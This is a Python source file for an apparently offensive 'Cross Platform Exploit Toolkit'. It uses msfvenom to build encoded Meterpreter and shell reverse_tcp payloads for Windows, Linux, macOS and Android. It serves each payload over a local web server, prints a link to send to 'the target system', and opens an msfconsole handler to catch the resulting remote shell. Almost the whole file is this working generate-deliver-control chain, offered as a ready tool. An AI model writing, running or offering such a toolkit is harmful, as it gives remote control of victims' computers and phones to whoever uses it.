import random
from subprocess import check_output, DEVNULL, Popen, run
from http.server import SimpleHTTPRequestHandler
from progress.spinner import MoonSpinner
from os import system, mkdir, getgid
from json import dump, load
from platform import node
from os.path import isdir
from time import sleep
import socketserver
import threading
import sys
import re


class c:
    B = '\033[1;34m'
    G = '\033[1;32m'
    R = '\033[1;31m'
    CY = '\033[1;36m'
    Y = '\033[1;33m'
    RE = '\033[0m'
    AN = '\033[05m'


def sudo_check(root):
    if getgid() == root:
        pass
    else:
        exit(c.R + '[' + c.Y + c.AN + '!' + c.RE + c.R + ']' + ' Run it as root!'.title())


file_downloaded = False


def get_folder_path():
    return folder_path


def get_menu_options():
    return menu_options


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=get_folder_path(), **kwargs)

    # Override do_GET to detect .exe file download
    def do_GET(self):
        global file_downloaded
        if not file_downloaded and self.path.endswith(('.exe', '.apk', '.macho', '.elf')):
            file_downloaded = True
            system('clear')
        super().do_GET()


def banner():
    print(f'\n\t   {c.AN + c.G} ({c.RE}          '
          f'{c.AN + c.G}({c.RE}          (  '
          f'       ({c.AN + c.G}({c.RE})'
          f'{c.AN + c.G}({c.RE}       (     '
          f'              ')
    print(f'\t   ){c.AN + c.G}\){c.RE})       '
          f'){c.AN + c.G}){c.RE}\       )\
          ( {c.AN + c.G}({c.RE}   /)     '
          f' ){c.AN + c.G}){c.RE} ')
    print(f'\t  ({c.AN + c.G}()/{c.RE}(     '
          f'( {c.AN + c.G}/{c.RE}({c.AN + c.G}'
          f'({c.RE}(       ( {c.AN + c.G}('
          f'{c.RE})      /{c.AN + c.G}({c.RE} '
          f'({c.AN + c.G}({c.RE}      '
          f'(/{c.AN + c.G}({c.RE}( ')
    print(f'\t  (_{c.AN + c.G}){c.RE}){c.AN + c.G}'
          f'({c.RE}    )\({c.AN + c.G}){c.RE}) '
          f'){c.AN + c.G}){c.RE}\    ) {c.AN + c.G}'
          f'({c.RE} /(    ){c.AN + c.G}){c.RE}'
          f')\ {c.AN + c.G}){c.RE}(    \(_{c.AN + c.G}){c.RE}(    ')
    print(f'\t {c.AN + c.G}({c.RE}_){c.AN + c.G}'
          f'){c.RE}_){c.AN + c.G}){c.RE}  ({c.AN + c.G}'
          f'({c.RE}_){c.AN + c.G}){c.RE}/ /({c.AN + c.G}'
          f'({c.RE}_)  (({c.AN + c.G}){c.RE} \(  ){c.AN + c.G}'
          f'){c.RE}_|({c.AN + c.G}({c.RE}_)({c.AN + c.G}'
          f'({c.RE}    )\){c.AN + c.G}){c.RE}_   ')
    print(f'\t ╭━━╮╭╮{c.AN + c.R}╱╱{c.RE}╭━━━┳━━━┳╮╭━╮ ╭━╮╭━┳╮{c.AN + c.R}'
          f'╱{c.RE}╭┳━╮╭━┳━╮╭━┳╮{c.AN + c.R}╱╱{c.RE}╭┳━━━╮')
    print(f'\t ┃╭╮┃┃┃{c.AN + c.R}╱╱{c.RE}┃╭━╮┃╭━╮┃┃┃╭╯ ┃┃╰╯┃┃┃{c.AN + c.R}╱'
          f'{c.RE}┃┃┃╰╯┃┃┃╰╯┃┃╰╮╭╯┃╭━╮┃')
    print(f'\t ┃╰╯╰┫┃{c.AN + c.R}╱╱{c.RE}┃┃{c.AN + c.R}╱{c.RE}┃┃┃{c.AN + c.R}'
          f'╱{c.RE}╰┫╰╯╯{c.AN + c.R}╱{c.RE} ┃╭╮╭╮┃┃{c.AN + c.R}╱{c.RE}'
          f'┃┃╭╮╭╮┃╭╮╭╮┣╮╰╯╭┫┃{c.AN + c.R}╱{c.RE}┃┃')
    print(f'\t ┃╭━╮┃┃{c.AN + c.R}╱{c.RE}╭┫╰━╯┃┃{c.AN + c.R}╱{c.RE}╭┫╭╮┃{c.AN + c.R}'
          f'╱{c.RE} ┃┃┃┃┃┃┃{c.AN + c.R}╱{c.RE}┃┃┃┃┃┃┃┃┃┃┃┃╰╮╭╯┃╰━╯┃')
    print(f'\t ┃╰━╯┃╰━╯┃╭━╮┃╰━╯┃┃┃╰╮ ┃┃┃┃┃┃╰━╯┃┃┃┃┃┃┃┃┃┃┃{c.AN + c.R}╱{c.RE}┃┃{c.AN + c.R}'
          f'╱{c.RE}┃╭━╮┃')
    print(f'\t ╰━━━┻━━━┻╯{c.AN + c.R}╱{c.RE}╰┻━━━┻╯╰━╯ ╰╯╰╯╰┻━━━┻╯╰╯╰┻╯╰╯╰╯{c.AN + c.R}'
          f'╱{c.RE}╰╯{c.AN + c.R}╱{c.RE}╰╯{c.AN + c.R}╱{c.RE}╰╯\n')
    print(f'\t{c.RE + c.CY} Cross Platform Exploit Toolkit    {c.RE}v1.0{c.RE + c.R}    By github.com/blackmummya\n\n')


def clear():
    system('clear')


def get_stored_req():
    file_name = '/usr/bin/User.json'
    try:
        with open(file_name) as f:
            user_node = load(f)
    except FileNotFoundError:
        return None
    else:
        return user_node


def get_new_req():
    banner()
    user_node = get_stored_req()
    if user_node:
        pass
    else:
        user_node = node()
        file_name = '/usr/bin/User.json'
        with open(file_name, 'w') as f:
            dump(user_node, f)
            percentages = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]
            bars = ['┃' * (i // 10 * 3) for i in percentages]
            command = 'pip install progress'
            run([command], shell=True, stdout=DEVNULL, stderr=DEVNULL)
            for bar, percentage in zip(bars, percentages):
                sleep(1)
                print(f'\r{c.RE}[{c.Y}{c.AN}!{c.RE}]{c.Y} Please Wait {c.Y}┃{bar:<30}┃ {percentage}%', end='',
                      flush=True)
            print()  # Move to the next line after progress bar is complete
            sleep(1)
            clear()


def moon_spinner():
    with MoonSpinner('Wait Until The Server Is Ready '.title()) as bar:
        for _ in range(190):
            sleep(0.02)
            bar.next()


def get_ip():
    get_configuration = check_output(['ifconfig', 'eth0'], text=True)
    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', get_configuration)
    if match:
        return match.group()
    else:
        print('[' + c.R + c.AN + '?' + c.RE + ']' + c.R + ' IP address not found.' + c.RE)
        sys.exit()


def loading_bar():
    percentages = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]
    bars = ['┃' * (i // 10 * 3) for i in percentages]
    for bar, percentage in zip(bars, percentages):
        sleep(1)
        print(f'\r{c.RE}{c.R}[{c.AN}💀{c.RE}{c.R}]{c.RE}{c.Y} Generating payload {c.Y}┃{bar:<30}┃ {percentage}%', end='',
              flush=True)
    print()  # Move to the next line after progress bar is complete


def windows_payload():
    payload_name = input(c.Y + '[' + c.RE + c.AN + '💀' + c.RE + c.Y + ']' + c.RE + ' Enter Name for Payload: '.title())
    payload_command = f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={grep_ip} LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > {payload_name}.exe'
    process = Popen(payload_command, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    clear()
    banner()
    while process.poll() is None:
        loading_bar()
    print(c.RE + c.R + '[' + c.RE + c.AN + '💀' + c.RE + c.R + ']' + c.Y + ' Payload generation complete.'.title() + c.RE)
    system(f'mv {payload_name}.exe {folder_path}')
    sleep(1)


def linux_payload():
    payload_name = input(c.Y + '[' + c.RE + c.AN + '💀' + c.RE + c.Y + ']' + c.RE + ' Enter Name for Payload: '.title())
    payload_command = f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={grep_ip} LPORT=4444 -f elf > {payload_name}.elf'
    process = Popen(payload_command, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    clear()
    banner()
    while process.poll() is None:
        loading_bar()
    print(c.RE + c.R + '[' + c.RE + c.AN + '💀' + c.RE + c.R + ']' + c.Y + ' Payload generation complete.'.title() + c.RE)
    system(f'mv {payload_name}.elf {folder_path}')
    sleep(1)


def mac_payload():
    payload_name = input(c.Y + '[' + c.RE + c.AN + '💀' + c.RE + c.Y + ']' + c.RE + ' Enter Name for Payload: '.title())
    payload_command = f'msfvenom -p osx/x86/shell_reverse_tcp LHOST={grep_ip} LPORT=4444 -f macho > {payload_name}.macho'
    process = Popen(payload_command, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    clear()
    banner()
    while process.poll() is None:
        loading_bar()
    print(c.RE + c.R + '[' + c.RE + c.AN + '💀' + c.RE + c.R + ']' + c.Y + ' Payload generation complete.'.title() + c.RE)
    system(f'mv {payload_name}.macho {folder_path}')
    sleep(1)


def android_payload():
    payload_name = input(c.Y + '[' + c.RE + c.AN + '💀' + c.RE + c.Y + ']' + c.RE + ' Enter Name for Payload: '.title())
    payload_command = (f'msfvenom -p android/meterpreter/reverse_tcp LHOST={grep_ip} LPORT=4444 -a dalvik '
                       f'--platform android -o {payload_name}.apk')
    process = Popen(payload_command, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    clear()
    banner()
    while process.poll() is None:
        loading_bar()
    print(c.RE + c.R + '[' + c.RE + c.AN + '💀' + c.RE + c.R + ']' + c.Y + ' Payload generation complete.'.title() + c.RE)
    system(f'mv {payload_name}.apk {folder_path}')
    sleep(1)


def countdown(httpd):
    global file_downloaded
    while not file_downloaded:
        sleep(1)

    for i in range(10, 0, -1):
        sleep(1)
        print(
            c.G + f"[+] The payload is downloaded, wait until the server shuts down {i}".title() + c.RE + ' ' * 10,
            end='\r')
    print()  # Print an empty line to move the cursor to the next line after the countdown
    httpd.shutdown()


def handle_incoming_connection():
    sleep(1)
    try:
        os_incoming_connection = ['windows', 'linux', 'mac', 'android']
        if get_menu_options() == 1:
            command = f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD {os_incoming_connection[0]}/meterpreter/reverse_tcp ; set LHOST {grep_ip} ; set LPORT 4444 ; exploit'"
            system(command)
        elif get_menu_options() == 2:
            command = f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD {os_incoming_connection[1]}/meterpreter/reverse_tcp ; set LHOST {grep_ip} ; set LPORT 4444 ; exploit'"
            system(command)
        elif get_menu_options() == 3:
            command = f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD {os_incoming_connection[2]}/meterpreter/reverse_tcp ; set LHOST {grep_ip} ; set LPORT 4444 ; exploit'"
            system(command)
        elif get_menu_options() == 4:
            command = f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD {os_incoming_connection[3]}/meterpreter/reverse_tcp ; set LHOST {grep_ip} ; set LPORT 4444 ; exploit'"
            system(command)
        else:
            sys.exit()
    except KeyboardInterrupt:
        clear()
        selection()


def start_server():
    global httpd
    clear()
    moon_spinner()
    clear()
    PORT = random.choice(range(8000, 9000))

    success = False
    while not success:
        try:
            httpd = socketserver.TCPServer((grep_ip, PORT), Handler)
            success = True
        except OSError as e:
            if e.errno == 98:  # Address already in use
                print(f"Port {PORT} is in use. Trying another one...")
                PORT = random.choice(range(8000, 9000))
                continue
            else:
                raise e

    print(c.CY + '[*] HINT: The target system must be on the same network!' + c.RE)
    print(c.CY + f"[!] Send that link to the target system ({grep_ip}:{PORT}/)" + c.RE)

    # Starting a separate thread for the countdown logic
    threading.Thread(target=countdown, args=(httpd,), daemon=True).start()

    try:
        # This will block until the server is shut down
        httpd.serve_forever()

    except KeyboardInterrupt:
        return None

    finally:
        # Perform cleanup actions if necessary
        httpd.server_close()
        sleep(1)
        clear()


def selection():
    global folder_path
    global menu_options
    clear()
    banner()

    try:
        menu_options = int(input(c.RE + '\t1.' + c.CY + ' Windows Payload.\n' +
                                 c.RE + '\t2.' + c.CY + ' Linux Payload.\n' +
                                 c.RE + '\t3.' + c.CY + ' Mac Payload.\n' +
                                 c.RE + '\t4.' + c.CY + ' Android Payload.\n\n' +
                                 c.RE + '\t0.' + c.CY + ' Exit\n\n' +
                                 c.RE + '[' + c.R + 'Main Menu' + c.RE + ']' + c.RE + ' Enter Selection > '.title()))
    except KeyboardInterrupt:
        clear()
        sys.exit()
    os_payloads = ['windows_payload', 'linux_payload', 'mac_payload', 'android_payload']

    if menu_options == 1:
        folder_path = check_output(['pwd'], text=True).strip() + '/' + os_payloads[0]
        if not isdir(os_payloads[0]):
            mkdir(os_payloads[0])
        windows_payload()
        start_server()
        clear()
        handle_incoming_connection()
    elif menu_options == 2:
        folder_path = check_output(['pwd'], text=True).strip() + '/' + os_payloads[1]
        if not isdir(os_payloads[1]):
            mkdir(os_payloads[1])
        linux_payload()
        start_server()
        clear()
        handle_incoming_connection()
    elif menu_options == 3:
        folder_path = check_output(['pwd'], text=True).strip() + '/' + os_payloads[2]
        if not isdir(os_payloads[2]):
            mkdir(os_payloads[2])
        mac_payload()
        start_server()
        clear()
        handle_incoming_connection()
    elif menu_options == 4:
        folder_path = check_output(['pwd'], text=True).strip() + '/' + os_payloads[3]
        if not isdir(os_payloads[3]):
            mkdir(os_payloads[3])
        android_payload()
        start_server()
        clear()
        handle_incoming_connection()
    elif menu_options == 0:
        sys.exit()
    else:
        print(c.RE + '[' + c.Y + '!' + c.RE + ']' + c.RE + ' invalid option.'.title())


if __name__ == '__main__':
    try:
        sudo_check(0)
        get_new_req()
        grep_ip = get_ip()
        selection()
    except Exception as e:
        print(c.R + '[' + c.Y + c.AN + '!' + c.RE + c.R + ']' + f' Error: {e}'.title())
